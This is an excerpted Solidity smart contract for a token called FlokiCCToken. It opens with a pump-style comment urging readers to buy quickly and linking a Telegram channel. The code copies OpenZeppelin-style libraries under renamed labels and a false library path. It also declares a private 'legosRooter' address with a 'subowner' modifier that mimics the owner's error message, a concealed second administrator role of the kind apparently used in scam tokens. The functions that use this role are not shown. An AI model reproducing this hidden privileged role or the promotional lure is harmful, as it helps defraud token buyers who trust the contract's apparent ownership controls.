...
/*
FlokiCC|$FlokiCC
Join the crypto revolution with FlokiCC's

FlokiCC propels us into a decentralized era. Act fast – 
secure your tokens now! 
💎🌐🤖
https://t.me/FlokiCCToken
*/
...
/*
 * @dev Provides information about the current execution FlokiCC20Burnable, including the
 ...
 */
abstract contract FlokiCC20Burnable {
...
// File: @openzeppelin/contracts/access/FlokiCC20Ownable.sol
 ...
 * the owner.
 */
abstract contract FlokiCC20Ownable is FlokiCC20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "FlokiCC20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "FlokiCC20Ownable: new owner is the zero address");
 ...
 * `SafeFlokiCC` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeFlokiCC {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeFlokiCC: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeFlokiCC: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeFlokiCC: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeFlokiCC: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeFlokiCC: modulo by zero");
  }
...
contract FlokiCCToken is FlokiCC20Burnable, FlokiCC33, FlokiCC20Ownable {
    
    using SafeFlokiCC for uint256;
   ...
   address private legosRooter; 
    ...
    string public FlokiCCtelegramcchannel = "https://t.me/FlokiCCToken";
            function getFlokiCCtelegramcchannel() public view returns (string memory) {
        return FlokiCCtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {FlokiCC33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "FlokiCC20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {FlokiCC33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {FlokiCC33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {FlokiCC33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "FlokiCC33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {FlokiCC33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "FlokiCC33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "FlokiCC33: transfer from the zero address");
        require(shippingto != address(0), "FlokiCC33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "FlokiCC33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "FlokiCC33: approve from the zero address");
        require(transporteur != address(0), "FlokiCC33: approve to the zero address");
